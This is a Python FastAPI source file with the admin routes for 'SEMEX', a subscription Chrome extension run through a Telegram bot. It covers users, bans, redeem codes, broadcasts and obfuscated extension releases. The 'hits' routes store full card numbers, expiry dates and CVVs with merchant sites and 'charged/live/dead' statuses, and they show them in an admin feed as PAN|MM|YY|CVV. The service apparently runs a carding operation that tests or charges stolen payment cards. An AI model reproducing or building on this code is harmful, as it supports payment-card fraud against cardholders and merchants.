"""Admin-only routes — users, hits, redeem code generation, news, bans."""
from __future__ import annotations

import asyncio
from datetime import datetime, timezone
from typing import List, Optional

from bson import ObjectId
from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel

from db import get_db
from deps import require_admin, require_owner
from models import ExtensionRelease, NewsPost, RedeemCode, User
from security import (
    generate_redeem_code,
    hash_redeem_code,
    preview_redeem_code,
)
from services.telegram import send_message
from config import settings

router = APIRouter(prefix="/api/admin", tags=["admin"])


@router.get("/is-owner")
async def is_owner(admin: User = Depends(require_admin)):
    """Return whether the current admin is the primary owner (can promote/demote)."""
    return {
        "isOwner": admin.telegram_id == settings.ADMIN_TELEGRAM_ID,
        "ownerTelegramId": settings.ADMIN_TELEGRAM_ID,
    }


class NukeBody(BaseModel):
    """Type NUKE to confirm — OWNER-ONLY total-wipe of the database."""
    confirm: str


@router.post("/db/nuke")
async def db_nuke(body: NukeBody, owner: User = Depends(require_owner)):
    """Wipe EVERY row of user-generated data. Owner-only. Requires body {"confirm":"NUKE"}.

    Collections wiped: users, sessions, hits, redeem_codes, user_bins, news_posts.
    NOT wiped: bin_cache (shared BIN metadata reference data, safe to keep).

    The owner will need to log in again via the Telegram bot; the config-based
    ADMIN_TELEGRAM_ID safety net auto-restores admin privileges on first sign-in.
    """
    if (body.confirm or "").strip().upper() != "NUKE":
        raise HTTPException(400, "Confirmation phrase mismatch. Send {\"confirm\":\"NUKE\"}.")

    db = get_db()
    wipes: dict[str, int] = {}
    for coll_name in ("users", "sessions", "hits", "redeem_codes", "user_bins", "news"):
        try:
            r = await db[coll_name].delete_many({})
            wipes[coll_name] = r.deleted_count
        except Exception as e:
            wipes[coll_name] = -1

    return {"success": True, "wiped": wipes, "note": "Owner must re-authenticate via Telegram bot; ADMIN_TELEGRAM_ID safety net will restore admin privileges automatically."}


@router.get("/stats")
async def stats(admin: User = Depends(require_admin)):
    db = get_db()
    users_total = await db.users.count_documents({})
    users_active = await db.users.count_documents(
        {"plan_expires_at": {"$gt": datetime.now(timezone.utc)}}
    )
    users_admin_ids = await db.users.count_documents({"is_admin": True})
    users_banned = await db.users.count_documents({"is_banned": True})
    hits_total = await db.hits.count_documents({})
    hits_charged = await db.hits.count_documents(
        {"status": {"$in": ["charged", "success", "approved", "succeeded"]}}
    )
    codes_unused = await db.redeem_codes.count_documents({"used": False})
    codes_used = await db.redeem_codes.count_documents({"used": True})
    return {
        "users": {
            "total": users_total,
            "active": users_active + users_admin_ids,
            "banned": users_banned,
        },
        "hits": {"total": hits_total, "charged": hits_charged},
        "codes": {"unused": codes_unused, "used": codes_used},
    }


# ---------- Users ----------

@router.get("/users")
async def list_users(limit: int = 100, admin: User = Depends(require_admin)):
    db = get_db()
    cursor = db.users.find({}).sort("created_at", -1).limit(min(limit, 500))
    out = []
    async for doc in cursor:
        pe = doc.get("plan_expires_at")
        if pe and hasattr(pe, "isoformat"):
            pe = pe.isoformat()
        out.append(
            {
                "telegramId": doc["telegram_id"],
                "username": doc.get("telegram_username"),
                "firstName": doc.get("telegram_first_name"),
                "lastName": doc.get("telegram_last_name"),
                "photoUrl": doc.get("telegram_photo_url"),
                "plan": doc.get("plan"),
                "planExpiresAt": pe,
                "isAdmin": doc.get("is_admin", False),
                "isBanned": doc.get("is_banned", False),
                "publicMuted": doc.get("public_muted", False),
                "hitCount": doc.get("hit_count", 0),
                "chargedCount": doc.get("charged_count", 0),
                "createdAt": doc["created_at"].isoformat() if doc.get("created_at") else None,
                "lastSeenAt": doc["last_seen_at"].isoformat() if doc.get("last_seen_at") else None,
            }
        )
    return {"users": out}


class BanBody(BaseModel):
    telegramId: int
    reason: Optional[str] = None


@router.post("/users/ban")
async def ban_user(body: BanBody, owner: User = Depends(require_owner)):
    if body.telegramId == owner.telegram_id:
        raise HTTPException(400, "Cannot ban yourself.")
    db = get_db()
    r = await db.users.update_one(
        {"telegram_id": body.telegramId},
        {"$set": {"is_banned": True, "banned_reason": body.reason or "Banned by admin", "plan": "*Dead*"}},
    )
    # Revoke all active sessions
    await db.sessions.update_many(
        {"telegram_id": body.telegramId, "revoked": False},
        {"$set": {"revoked": True}},
    )
    return {"success": r.modified_count > 0}


@router.post("/users/unban")
async def unban_user(body: BanBody, owner: User = Depends(require_owner)):
    db = get_db()
    r = await db.users.update_one(
        {"telegram_id": body.telegramId},
        {"$set": {"is_banned": False, "banned_reason": None}, "$unset": {}},
    )
    return {"success": r.modified_count > 0}


class PublicMuteBody(BaseModel):
    telegramId: int
    muted: bool


@router.post("/users/public-mute")
async def public_mute_user(body: PublicMuteBody, owner: User = Depends(require_owner)):
    """Owner-configurable per-user toggle. When muted=True, this user's hits are
    NOT forwarded to the public showcase channel — but user's DM + admin log
    still fire normally. Use to silence noisy accounts without banning them."""
    db = get_db()
    r = await db.users.update_one(
        {"telegram_id": body.telegramId},
        {"$set": {"public_muted": bool(body.muted)}},
    )
    return {"success": r.matched_count > 0, "muted": bool(body.muted)}




# ---------- Admin promotion (OWNER-ONLY) ----------

class PromoteBody(BaseModel):
    telegramId: int


@router.post("/users/promote")
async def promote_user(body: PromoteBody, owner: User = Depends(require_owner)):
    """Grant admin privileges to a user. OWNER only."""
    if body.telegramId == owner.telegram_id:
        raise HTTPException(400, "You are already the owner.")
    db = get_db()
    doc = await db.users.find_one({"telegram_id": body.telegramId})
    if not doc:
        raise HTTPException(404, "User not found.")
    if doc.get("is_admin"):
        return {"success": True, "alreadyAdmin": True}
    await db.users.update_one(
        {"telegram_id": body.telegramId},
        {"$set": {"is_admin": True, "is_banned": False, "banned_reason": None}},
    )
    # Notify the promoted user via Telegram DM (best effort)
    try:
        await send_message(
            body.telegramId,
            "⚜️ <b>You have been promoted to Admin</b>\n\n"
            "You now have unlimited access and admin privileges on SEMEX.\n"
            "Reload the extension to see the new Admin panel.",
        )
    except Exception:
        pass
    return {"success": True, "isAdmin": True}


@router.post("/users/demote")
async def demote_user(body: PromoteBody, owner: User = Depends(require_owner)):
    """Revoke admin privileges from a user. OWNER only.

    Cannot demote yourself (you are the owner).
    """
    if body.telegramId == owner.telegram_id:
        raise HTTPException(400, "You cannot demote the owner.")
    db = get_db()
    doc = await db.users.find_one({"telegram_id": body.telegramId})
    if not doc:
        raise HTTPException(404, "User not found.")
    if not doc.get("is_admin"):
        return {"success": True, "alreadyDemoted": True}
    await db.users.update_one(
        {"telegram_id": body.telegramId},
        {"$set": {"is_admin": False}},
    )
    try:
        await send_message(
            body.telegramId,
            "⚠️ <b>Admin privileges revoked</b>\n\n"
            "Your admin access on SEMEX has been removed by the owner.",
        )
    except Exception:
        pass
    return {"success": True, "isAdmin": False}


class ExtendBody(BaseModel):
    telegramId: int
    days: int  # -1 for lifetime


@router.post("/users/extend")
async def extend_user(body: ExtendBody, owner: User = Depends(require_owner)):
    from datetime import timedelta
    db = get_db()
    user_doc = await db.users.find_one({"telegram_id": body.telegramId})
    if not user_doc:
        raise HTTPException(404, "User not found.")
    now = datetime.now(timezone.utc)
    if body.days < 0:
        new_expiry = None
        plan = "VIP"
    else:
        existing = user_doc.get("plan_expires_at")
        if existing and existing.tzinfo is None:
            existing = existing.replace(tzinfo=timezone.utc)
        base = existing if (existing and existing > now) else now
        new_expiry = base + timedelta(days=body.days)
        if body.days >= 365:
            plan = "YEARLY"
        elif body.days >= 30:
            plan = "MONTHLY"
        elif body.days >= 7:
            plan = "WEEKLY"
        else:
            plan = "TRIAL"
    await db.users.update_one(
        {"telegram_id": body.telegramId},
        {"$set": {"plan": plan, "plan_expires_at": new_expiry, "is_banned": False, "banned_reason": None}},
    )
    return {"success": True, "plan": plan, "planExpiresAt": new_expiry.isoformat() if new_expiry else None}


class RevokeBody(BaseModel):
    telegramId: int


@router.post("/users/revoke-sessions")
async def revoke_all_sessions(body: RevokeBody, owner: User = Depends(require_owner)):
    db = get_db()
    r = await db.sessions.update_many(
        {"telegram_id": body.telegramId, "revoked": False},
        {"$set": {"revoked": True}},
    )
    return {"success": True, "count": r.modified_count}


# ---------- Redeem codes ----------

PLAN_TAG_BY_DAYS_DEFAULT = {
    1: "TRIAL", 3: "TRIAL", 7: "WEEKLY", 10: "PLUS", 14: "PLUS",
    30: "MONTHLY", 90: "MONTHLY", 180: "MONTHLY", 365: "YEARLY",
}


class GenCodesBody(BaseModel):
    days: int
    quantity: int = 1
    prefix: str = "SEMEX"
    plan_tag: Optional[str] = None
    note: Optional[str] = None


@router.post("/codes/generate")
async def generate_codes(body: GenCodesBody, owner: User = Depends(require_owner)):
    if body.quantity < 1 or body.quantity > 500:
        raise HTTPException(400, "Quantity must be 1-500.")
    db = get_db()
    tag = body.plan_tag or (
        "VIP" if body.days < 0 else PLAN_TAG_BY_DAYS_DEFAULT.get(
            body.days,
            "YEARLY" if body.days >= 365 else "MONTHLY" if body.days >= 30 else "WEEKLY" if body.days >= 7 else "TRIAL",
        )
    )
    generated = []
    for _ in range(body.quantity):
        code = generate_redeem_code(body.prefix)
        doc = RedeemCode(
            code_hash=hash_redeem_code(code),
            code_preview=preview_redeem_code(code),
            duration_days=body.days,
            plan_tag=tag,
            created_by=owner.telegram_id,
            note=body.note,
        )
        await db.redeem_codes.insert_one(doc.to_mongo())
        generated.append(code)
    return {"success": True, "codes": generated, "count": len(generated), "planTag": tag}


@router.get("/codes")
async def list_codes(
    used: Optional[bool] = None,
    limit: int = 100,
    admin: User = Depends(require_admin),
):
    db = get_db()
    q = {}
    if used is not None:
        q["used"] = used
    cursor = db.redeem_codes.find(q).sort("created_at", -1).limit(min(limit, 500))
    out = []
    async for doc in cursor:
        out.append(
            {
                "id": str(doc["_id"]),
                "preview": doc.get("code_preview"),
                "durationDays": doc.get("duration_days"),
                "planTag": doc.get("plan_tag"),
                "used": doc.get("used", False),
                "usedBy": doc.get("used_by"),
                "usedAt": doc["used_at"].isoformat() if doc.get("used_at") else None,
                "createdAt": doc["created_at"].isoformat() if doc.get("created_at") else None,
                "note": doc.get("note"),
            }
        )
    return {"codes": out}


@router.delete("/codes/{code_id}")
async def delete_code(code_id: str, owner: User = Depends(require_owner)):
    db = get_db()
    try:
        oid = ObjectId(code_id)
    except Exception:
        raise HTTPException(400, "Bad id")
    r = await db.redeem_codes.delete_one({"_id": oid, "used": False})
    return {"success": r.deleted_count > 0}


# ---------- Hits ----------

@router.get("/hits")
async def list_all_hits(
    limit: int = 50,
    status: Optional[str] = None,
    telegram_id: Optional[int] = None,
    admin: User = Depends(require_admin),
):
    db = get_db()
    q: dict = {}
    if status:
        q["status"] = status
    else:
        # Admin dashboard shows only CHARGED hits — never LIVE/DEAD/declined.
        q["status"] = {"$regex": r"^(charged|success|approved|succeeded|captured)$", "$options": "i"}
    if telegram_id:
        q["telegram_id"] = telegram_id
    cursor = db.hits.find(q, {"screenshot_b64": 0}).sort("created_at", -1).limit(min(limit, 500))
    out = []
    # Batch-resolve usernames for the hits we're returning so the admin feed can
    # display "@username" alongside every card. One extra query total, not N+1.
    tg_ids: set[int] = set()
    raw_docs = []
    async for doc in cursor:
        raw_docs.append(doc)
        if doc.get("telegram_id"):
            tg_ids.add(int(doc["telegram_id"]))
    user_map: dict[int, dict] = {}
    if tg_ids:
        async for u in db.users.find(
            {"telegram_id": {"$in": list(tg_ids)}},
            {"telegram_id": 1, "telegram_username": 1, "telegram_first_name": 1},
        ):
            user_map[int(u["telegram_id"])] = u
    for doc in raw_docs:
        doc["id"] = str(doc.pop("_id"))
        if "created_at" in doc and hasattr(doc["created_at"], "isoformat"):
            doc["created_at"] = doc["created_at"].isoformat()
        u = user_map.get(int(doc.get("telegram_id") or 0), {}) if doc.get("telegram_id") else {}
        doc["username"] = u.get("telegram_username") or None
        doc["first_name"] = u.get("telegram_first_name") or None
        # Convenience: single flat "card" string + site host + amount/currency so
        # the admin panel's charge feed shows PAN|MM|YY|CVV, site, amount, user.
        num = doc.get("card_number") or ""
        mm = str(doc.get("card_exp_month") or "").zfill(2) if doc.get("card_exp_month") else ""
        yy = str(doc.get("card_exp_year") or "")[-2:] if doc.get("card_exp_year") else ""
        cvv = str(doc.get("card_cvv") or "")
        if num:
            parts = [num]
            if mm: parts.append(mm)
            if yy: parts.append(yy)
            if cvv: parts.append(cvv)
            doc["card"] = "|".join(parts)
        else:
            doc["card"] = None
        doc["site"] = doc.get("hostname") or doc.get("merchant") or doc.get("site_url") or doc.get("url") or None
        out.append(doc)
    return {"hits": out}


@router.get("/hits/{hit_id}/screenshot")
async def get_hit_screenshot(hit_id: str, admin: User = Depends(require_admin)):
    db = get_db()
    try:
        oid = ObjectId(hit_id)
    except Exception:
        raise HTTPException(400, "Bad id")
    doc = await db.hits.find_one({"_id": oid}, {"screenshot_b64": 1})
    if not doc or not doc.get("screenshot_b64"):
        raise HTTPException(404, "No screenshot")
    return {"screenshot": doc["screenshot_b64"]}


# ---------- News ----------

class NewsBody(BaseModel):
    title: str
    body: str
    important: bool = False


@router.post("/news")
async def post_news(body: NewsBody, owner: User = Depends(require_owner)):
    db = get_db()
    n = NewsPost(title=body.title, body=body.body, author_id=owner.telegram_id, important=body.important)
    r = await db.news.insert_one(n.to_mongo())
    return {"success": True, "id": str(r.inserted_id)}


@router.delete("/news/{news_id}")
async def delete_news(news_id: str, owner: User = Depends(require_owner)):
    db = get_db()
    try:
        oid = ObjectId(news_id)
    except Exception:
        raise HTTPException(400, "Bad id")
    r = await db.news.delete_one({"_id": oid})
    return {"success": r.deleted_count > 0}


# ---------- Broadcast ----------

class BroadcastBody(BaseModel):
    message: str
    include_admins: bool = False
    include_expired: bool = False
    only_plans: Optional[List[str]] = None  # e.g. ["WEEKLY", "MONTHLY"]


@router.post("/broadcast")
async def broadcast(body: BroadcastBody, owner: User = Depends(require_owner)):
    db = get_db()
    q: dict = {"is_banned": {"$ne": True}}
    if not body.include_admins:
        q["is_admin"] = {"$ne": True}
    if not body.include_expired:
        from datetime import datetime, timezone
        q["$or"] = [
            {"plan_expires_at": {"$gt": datetime.now(timezone.utc)}},
            {"is_admin": True},
        ]
    if body.only_plans:
        q["plan"] = {"$in": body.only_plans}

    prefix = "📣 <b>SEMEX Announcement</b>\n\n"
    text = prefix + body.message

    sent, failed = 0, 0
    cursor = db.users.find(q, {"telegram_id": 1})
    async for u in cursor:
        try:
            r = await send_message(u["telegram_id"], text)
            if r and r.get("ok"):
                sent += 1
            else:
                failed += 1
        except Exception:
            failed += 1

    return {"success": True, "sent": sent, "failed": failed}


class BroadcastPreviewBody(BaseModel):
    include_admins: bool = False
    include_expired: bool = False
    only_plans: Optional[List[str]] = None


@router.post("/broadcast/preview")
async def broadcast_preview(body: BroadcastPreviewBody, owner: User = Depends(require_owner)):
    """Return the number of users who would receive the broadcast (dry run)."""
    db = get_db()
    q: dict = {"is_banned": {"$ne": True}}
    if not body.include_admins:
        q["is_admin"] = {"$ne": True}
    if not body.include_expired:
        from datetime import datetime, timezone
        q["$or"] = [
            {"plan_expires_at": {"$gt": datetime.now(timezone.utc)}},
            {"is_admin": True},
        ]
    if body.only_plans:
        q["plan"] = {"$in": body.only_plans}
    count = await db.users.count_documents(q)
    return {"count": count}


# =========================================================================
# EXTENSION RELEASE MANAGEMENT — owner uploads new .zip, users get via /get
# =========================================================================
import io
import re
import zipfile
from pathlib import Path

from fastapi import File, Form, UploadFile
from fastapi.responses import FileResponse

RELEASES_DIR = Path("/app/extension_releases")
RELEASES_DIR.mkdir(parents=True, exist_ok=True)
MAX_ZIP_BYTES = 25 * 1024 * 1024  # 25 MB safety cap
_ZIP_MAGIC = b"PK\x03\x04"


def _detect_obfuscated(zdata: bytes) -> bool:
    """Heuristic: peek at popup/popup.js inside the zip; if it looks minified
    or uses `_0x` hex names it's likely obfuscated."""
    try:
        with zipfile.ZipFile(io.BytesIO(zdata)) as zf:
            candidates = [n for n in zf.namelist() if n.endswith("popup/popup.js") or n.endswith("popup.js")]
            if not candidates:
                return False
            with zf.open(candidates[0]) as f:
                # First ~4KB is enough to sniff
                head = f.read(4096).decode("utf-8", errors="replace")
            if "_0x" in head:
                return True
            # Line-length heuristic — obfuscated single-line output has ONE >200 char line
            longest = max((len(l) for l in head.splitlines()), default=0)
            return longest > 400
    except Exception:
        return False


@router.get("/extension/versions")
async def list_extension_versions(admin: User = Depends(require_admin)):
    db = get_db()
    cursor = db.extension_releases.find({}).sort("published_at", -1).limit(50)
    out = []
    async for doc in cursor:
        out.append({
            "id": str(doc["_id"]),
            "version": doc.get("version"),
            "filename": doc.get("filename"),
            "sizeBytes": doc.get("size_bytes"),
            "notes": doc.get("notes"),
            "isLatest": bool(doc.get("is_latest")),
            "isMinimum": bool(doc.get("is_minimum")),
            "publishedBy": doc.get("published_by"),
            "publishedAt": doc.get("published_at").isoformat() if doc.get("published_at") else None,
            "obfuscated": bool(doc.get("obfuscated")),
            "downloadCount": doc.get("download_count", 0),
        })
    return {"releases": out}


@router.post("/extension/publish")
async def publish_extension(
    version: str = Form(...),
    notes: Optional[str] = Form(None),
    make_minimum: bool = Form(False),   # if True → mark this release as the MIN required version
    auto_broadcast: bool = Form(True),  # if True → DM every non-banned user with the update link
    file: UploadFile = File(...),
    owner: User = Depends(require_owner),
):
    """Upload a new extension .zip. Marks it as the latest — /get and
    /api/telegram/download/extension will serve THIS zip from now on.

    OWNER ONLY — promoted admins cannot publish new releases.

    When `make_minimum` is True, every extension below this version will be
    locked out of the API (HTTP 426 on every /api/* call except auth/public).
    When `auto_broadcast` is True (default), the bot DMs every non-banned
    user a message telling them to run /get and reinstall.
    """
    version_clean = re.sub(r"[^0-9A-Za-z._-]", "", version)[:32] or "unknown"
    # STRICT semver validation. A version like "3" alone would make every real
    # build (2.3.9, 2.4.0, etc.) look outdated and paywall the newest ext to
    # itself. Require at least MAJOR.MINOR — e.g. "2.3", "2.3.9", "10.0.1".
    if not re.match(r"^\d+\.\d+(?:\.\d+)?(?:\.\d+)?$", version_clean):
        raise HTTPException(
            400,
            f"Invalid version '{version}'. Use semver like 2.3.9 (at least MAJOR.MINOR).",
        )

    data = await file.read()
    if not data:
        raise HTTPException(400, "Empty upload")
    if len(data) > MAX_ZIP_BYTES:
        raise HTTPException(413, f"File too large (max {MAX_ZIP_BYTES // 1024 // 1024}MB)")
    if not data.startswith(_ZIP_MAGIC):
        raise HTTPException(400, "File is not a valid .zip")

    # Sanity check — must be a real zip and contain manifest.json
    try:
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            names = zf.namelist()
            if not any(n.endswith("manifest.json") for n in names):
                raise HTTPException(400, "Zip does not contain a Chrome extension manifest.json")
    except zipfile.BadZipFile:
        raise HTTPException(400, "Corrupt .zip file")

    obfuscated = _detect_obfuscated(data)

    stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    filename = f"semex-{version_clean}-{stamp}.zip"
    path = RELEASES_DIR / filename
    path.write_bytes(data)

    db = get_db()
    # Demote everyone else from is_latest / is_minimum when appropriate
    await db.extension_releases.update_many({"is_latest": True}, {"$set": {"is_latest": False}})
    if make_minimum:
        await db.extension_releases.update_many({"is_minimum": True}, {"$set": {"is_minimum": False}})

    rel = ExtensionRelease(
        version=version_clean,
        filename=filename,
        file_path=str(path),
        size_bytes=len(data),
        notes=(notes or None),
        is_latest=True,
        is_minimum=bool(make_minimum),
        published_by=owner.telegram_id,
        obfuscated=obfuscated,
    )
    r = await db.extension_releases.insert_one(rel.to_mongo())

    # Invalidate the cached min-version so the middleware picks up the new one
    # immediately (not on the next 60s expiry).
    try:
        from routes.data import _MIN_EXTENSION_CACHE
        _MIN_EXTENSION_CACHE["version"] = None
        _MIN_EXTENSION_CACHE["expires"] = 0.0
    except Exception:
        pass

    # Auto-broadcast to every non-banned user — dispatched as a background
    # task so the /publish response returns IMMEDIATELY. Previously this
    # looped synchronously and timed out at the Railway ingress on any
    # non-trivial user base (uploads stayed spinning forever).
    broadcast_queued = 0
    if auto_broadcast:
        bot_handle = settings.TELEGRAM_BOT_USERNAME or "SemexBot"
        base = str(settings.BASE_URL or "").rstrip("/") if getattr(settings, "BASE_URL", None) else ""
        dl_url = f"{base}/api/telegram/download/extension" if base else "/api/telegram/download/extension"
        text = (
            f"🚀 <b>SEMEX v{version_clean} is out</b>\n"
            f"\n"
            f"{'⚠️ <b>This update is REQUIRED</b> — older versions are now blocked from the server. ' if make_minimum else 'A new release is available. '}"
            f"Please update your extension now.\n"
            f"\n"
            f"📥 <b>Get the new zip:</b>\n"
            f"• Send <code>/get</code> to @{bot_handle}\n"
            f"• Or download: {dl_url}\n"
            f"\n"
            f"After downloading, open <code>chrome://extensions</code>, remove the old SEMEX, unzip the new file, and click <b>Load unpacked</b>.\n"
            f"\n"
            f"{('<i>Release notes:</i> ' + notes) if notes else ''}"
        ).strip()
        # Pre-count to give the admin panel an idea of scope.
        broadcast_queued = await db.users.count_documents({"is_banned": {"$ne": True}})

        async def _run_broadcast():
            try:
                async for u in db.users.find({"is_banned": {"$ne": True}}, {"telegram_id": 1}):
                    try:
                        await send_message(int(u["telegram_id"]), text)
                    except Exception:
                        pass
            except Exception:
                pass

        asyncio.create_task(_run_broadcast())

    return {
        "success": True,
        "id": str(r.inserted_id),
        "version": version_clean,
        "sizeBytes": len(data),
        "obfuscated": obfuscated,
        "isMinimum": bool(make_minimum),
        "broadcastQueued": broadcast_queued,
        "warning": None if obfuscated else "This build does NOT appear to be obfuscated. Rebuild with `build.sh --obfuscate` before shipping to public users.",
    }


@router.post("/extension/versions/{release_id}/make-latest")
async def make_latest(release_id: str, owner: User = Depends(require_owner)):
    try:
        oid = ObjectId(release_id)
    except Exception:
        raise HTTPException(400, "Bad id")
    db = get_db()
    doc = await db.extension_releases.find_one({"_id": oid})
    if not doc:
        raise HTTPException(404, "Release not found")
    await db.extension_releases.update_many({"is_latest": True}, {"$set": {"is_latest": False}})
    await db.extension_releases.update_one({"_id": oid}, {"$set": {"is_latest": True}})
    return {"success": True}


@router.post("/extension/versions/{release_id}/make-minimum")
async def make_minimum(release_id: str, owner: User = Depends(require_owner)):
    """Promote an existing release to the MIN required version. Every extension
    below this is locked out of the API with HTTP 426 on every /api/* call
    (except auth/public/telegram-webhooks). Bumps the cached min-version so the
    middleware picks up the change instantly.

    Refuses to promote a release whose stored version isn't a real semver
    (e.g. bare "3") — that would paywall every real build against itself.
    """
    try:
        oid = ObjectId(release_id)
    except Exception:
        raise HTTPException(400, "Bad id")
    db = get_db()
    doc = await db.extension_releases.find_one({"_id": oid})
    if not doc:
        raise HTTPException(404, "Release not found")
    stored_v = str(doc.get("version") or "").strip()
    if not re.match(r"^\d+\.\d+(?:\.\d+)?(?:\.\d+)?$", stored_v):
        raise HTTPException(
            400,
            f"Release version '{stored_v}' is not a valid semver (need MAJOR.MINOR at minimum). "
            "Delete this release + republish with a proper version like 2.3.9.",
        )
    await db.extension_releases.update_many({"is_minimum": True}, {"$set": {"is_minimum": False}})
    await db.extension_releases.update_one({"_id": oid}, {"$set": {"is_minimum": True}})
    # Bust the cache so the change takes effect immediately.
    try:
        from routes.data import _MIN_EXTENSION_CACHE
        _MIN_EXTENSION_CACHE["version"] = None
        _MIN_EXTENSION_CACHE["expires"] = 0.0
    except Exception:
        pass
    return {"success": True, "version": doc.get("version")}


@router.post("/extension/cleanup-invalid")
async def cleanup_invalid_releases(owner: User = Depends(require_owner)):
    """Purge extension_releases rows whose version isn't a real semver. Fixes
    the "Update Required v3" paywall-loop bug when a bogus version somehow
    landed in the DB. Also busts the min-version cache so the next
    /api/public/version call reflects the cleanup instantly.
    """
    db = get_db()
    good_rx = re.compile(r"^\d+\.\d+(?:\.\d+)?(?:\.\d+)?$")
    removed = []
    async for doc in db.extension_releases.find({}, {"version": 1, "filename": 1}):
        v = str(doc.get("version") or "").strip()
        if not good_rx.match(v):
            removed.append({"id": str(doc["_id"]), "version": v, "filename": doc.get("filename")})
    if removed:
        await db.extension_releases.delete_many(
            {"_id": {"$in": [ObjectId(r["id"]) for r in removed]}}
        )
    # Bust cache
    try:
        from routes.data import _MIN_EXTENSION_CACHE
        _MIN_EXTENSION_CACHE["version"] = None
        _MIN_EXTENSION_CACHE["expires"] = 0.0
    except Exception:
        pass
    return {"success": True, "removed_count": len(removed), "removed": removed}


@router.delete("/extension/versions/{release_id}")
async def delete_release(release_id: str, owner: User = Depends(require_owner)):
    try:
        oid = ObjectId(release_id)
    except Exception:
        raise HTTPException(400, "Bad id")
    db = get_db()
    doc = await db.extension_releases.find_one({"_id": oid})
    if not doc:
        raise HTTPException(404, "Release not found")
    # Delete file from disk (best-effort)
    try:
        Path(doc.get("file_path", "")).unlink(missing_ok=True)
    except Exception:
        pass
    await db.extension_releases.delete_one({"_id": oid})
    # If we deleted the latest, promote the newest remaining one
    if doc.get("is_latest"):
        newest = await db.extension_releases.find_one({}, sort=[("published_at", -1)])
        if newest:
            await db.extension_releases.update_one({"_id": newest["_id"]}, {"$set": {"is_latest": True}})
    return {"success": True}


class BroadcastReleaseBody(BaseModel):
    include_admins: bool = True
    include_expired: bool = False
    extra_note: Optional[str] = None


@router.post("/extension/versions/{release_id}/broadcast")
async def broadcast_release(
    release_id: str,
    body: BroadcastReleaseBody,
    owner: User = Depends(require_owner),
):
    """DM every active user telling them a new extension version is live.

    They fetch the actual zip via the Telegram bot /get command or via
    the public /api/telegram/download/extension URL.
    """
    try:
        oid = ObjectId(release_id)
    except Exception:
        raise HTTPException(400, "Bad id")
    db = get_db()
    doc = await db.extension_releases.find_one({"_id": oid})
    if not doc:
        raise HTTPException(404, "Release not found")

    q: dict = {"is_banned": {"$ne": True}}
    if not body.include_admins:
        q["is_admin"] = {"$ne": True}
    if not body.include_expired:
        now = datetime.now(timezone.utc)
        q["$or"] = [
            {"plan_expires_at": None},
            {"plan_expires_at": {"$gt": now}},
            {"is_admin": True},
        ]

    msg = (
        f"🚀 <b>SEMEX update: v{doc.get('version')}</b>\n\n"
        + (f"<i>{(doc.get('notes') or '').strip()}</i>\n\n" if doc.get("notes") else "")
        + (f"{body.extra_note.strip()}\n\n" if body.extra_note else "")
        + "Grab the new build by sending <code>/get</code> to this bot, or "
        "reload the extension from the same zip if you're already up to date."
    )
    sent = 0
    failed = 0
    cursor = db.users.find(q, {"telegram_id": 1})
    async for u in cursor:
        try:
            r = await send_message(u["telegram_id"], msg)
            if r and r.get("ok"):
                sent += 1
            else:
                failed += 1
        except Exception:
            failed += 1
    return {"success": True, "sent": sent, "failed": failed}


# ---------- Server-side "Build & Publish" — no terminal required ----------

import asyncio as _asyncio
import os as _os


class RebuildBody(BaseModel):
    version: str
    notes: Optional[str] = None
    obfuscate: bool = True
    make_latest: bool = True


@router.post("/extension/rebuild-and-publish")
async def rebuild_and_publish(body: RebuildBody, owner: User = Depends(require_owner)):
    """Runs `build.sh <API_URL> --obfuscate` on the server, then publishes the
    resulting zip as a new release. One-click alternative to uploading a zip
    from your laptop.
    """
    version_clean = re.sub(r"[^0-9A-Za-z._-]", "", body.version)[:32] or "unknown"

    # Discover the public API URL from the environment (Railway exposes it).
    api_url = (
        _os.environ.get("PUBLIC_API_URL")
        or _os.environ.get("REACT_APP_BACKEND_URL")
        or _os.environ.get("RAILWAY_PUBLIC_DOMAIN")
    )
    if not api_url:
        raise HTTPException(400, "PUBLIC_API_URL (or REACT_APP_BACKEND_URL) env var not set — cannot inject correct API URL into the build.")
    if not api_url.startswith("http"):
        api_url = "https://" + api_url

    build_script = "/app/semex/build.sh"
    if not Path(build_script).exists():
        raise HTTPException(500, "build.sh missing on server — cannot rebuild.")

    args = ["bash", build_script, api_url]
    if body.obfuscate:
        args.append("--obfuscate")

    try:
        proc = await _asyncio.create_subprocess_exec(
            *args,
            stdout=_asyncio.subprocess.PIPE,
            stderr=_asyncio.subprocess.STDOUT,
            cwd="/app/semex",
        )
        try:
            out, _ = await _asyncio.wait_for(proc.communicate(), timeout=180)
        except _asyncio.TimeoutError:
            proc.kill()
            raise HTTPException(504, "Build timed out after 3 minutes")
    except FileNotFoundError:
        raise HTTPException(500, "bash / build.sh not available on this host")

    if proc.returncode != 0:
        tail = (out or b"").decode("utf-8", errors="replace")[-2000:]
        raise HTTPException(500, f"Build failed (exit {proc.returncode}):\n{tail}")

    # Find the resulting zip
    zip_path = Path("/app/semex-v2.2.0.zip")
    if not zip_path.exists():
        # Search for any semex*.zip newer than the build_script mtime
        candidates = sorted(Path("/app").glob("semex*.zip"), key=lambda p: p.stat().st_mtime, reverse=True)
        if candidates:
            zip_path = candidates[0]
        else:
            raise HTTPException(500, "Build succeeded but no output zip found in /app")

    data = zip_path.read_bytes()
    obfuscated = _detect_obfuscated(data)

    # Persist a copy in the releases folder + record in DB
    stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    filename = f"semex-{version_clean}-{stamp}.zip"
    dst = RELEASES_DIR / filename
    dst.write_bytes(data)

    db = get_db()
    if body.make_latest:
        await db.extension_releases.update_many({"is_latest": True}, {"$set": {"is_latest": False}})

    rel = ExtensionRelease(
        version=version_clean,
        filename=filename,
        file_path=str(dst),
        size_bytes=len(data),
        notes=(body.notes or f"Built server-side with --obfuscate={body.obfuscate}"),
        is_latest=body.make_latest,
        published_by=owner.telegram_id,
        obfuscated=obfuscated,
    )
    r = await db.extension_releases.insert_one(rel.to_mongo())

    return {
        "success": True,
        "id": str(r.inserted_id),
        "version": version_clean,
        "sizeBytes": len(data),
        "obfuscated": obfuscated,
        "buildLog": (out or b"").decode("utf-8", errors="replace")[-800:],
    }
